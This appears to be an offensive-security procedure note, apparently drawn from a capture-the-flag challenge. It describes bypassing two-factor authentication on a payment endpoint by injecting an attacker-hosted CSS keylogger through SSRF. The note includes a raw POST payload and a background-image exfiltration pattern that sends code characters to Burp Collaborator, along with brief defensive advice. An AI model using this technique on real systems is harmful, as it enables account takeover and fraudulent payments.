---
tags:
  - ssrf
  - css-keylogger
  - 2fa-bypass
  - blind-exfiltration
type: procedure
tools:
  - '[[tools/Burp-Collaborator]]'
tactics:
  - '[[Initial Access]]'
commands:
  - '[[commands/post-payment-ssrf]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[JavaScript]]'
updated_at: '2025-12-14T17:33:06.023Z'
skill_level: advanced
impact_level: critical
detection_risk: high
sub_techniques: []
id: 63afbabb-7708-433e-b734-e180b12bd169
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[JavaScript]]'
---
# Bypass Final 2FA with SSRF CSS Keylogger and Approve Payment

## Summary

This procedure exploits SSRF in the payment endpoint to load an external CSS keylogger during 2FA, capturing the code via blind exfiltration and enabling transaction approval.

## Description

The /pay endpoint accepts app_style parameter, loaded via Headless Chrome without validation. Setting it to an attacker-controlled CSS URL triggers background-image requests on 2FA input elements using nth-child selectors, exfiltrating each character to Burp Collaborator.

## Requirements

1. CEO account session
2. Hosted CSS keylogger on attacker server
3. OOB monitoring tool like Burp Collaborator

## Defense

Defensive measures and detection strategies:

- Validate and allowlist CSS URLs; block external loads
- Disable or sandbox CSS in automated browsers
- Monitor for anomalous outbound requests from app servers

## Objectives

1. Trigger SSRF to load malicious CSS
2. Capture 2FA code via keylogger
3. Approve payment with stolen code

## Instructions

### Step 1: Initiate Payment with SSRF Payload

**Context**: Inject app_style for CSS load.

**Command** ([[commands/post-payment-ssrf]]):
```bash
POST /pay/17538771/27cd1393c170e1e97f9507a5351ea1ba HTTP/1.1
app_style=https%3A%2F%2Fwww.bountypay.h1ctf.com%2Fcss%2Funi_2fa_style.css
```

> Replace with attacker URL. Expected output: 2FA prompt loads CSS.

### Step 2: Monitor Keylogger Exfiltration

**Context**: Capture keystrokes via OOB.

Use Burp Collaborator to detect requests like background-image: url(https://collaborator/oob?char=1).

> Expected output: Sequential characters forming 2FA code.

### Step 3: Submit Captured Code

**Context**: Complete approval.

Enter the reconstructed code in the 2FA form.

> Expected output: Payment approved, flag obtained.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]] Initial Access

### Techniques

- [[Exploit Public-Facing Application]] Exploit Public-Facing Application
- [[JavaScript]] JavaScript (adapted for CSS exfil)

### Sub-Techniques

- None

## Commands Used

- [[commands/post-payment-ssrf]]

## Tools Used

- [[tools/Burp-Collaborator]]

## Tags

- ssrf
- css-keylogger
- 2fa-bypass
- blind-exfiltration
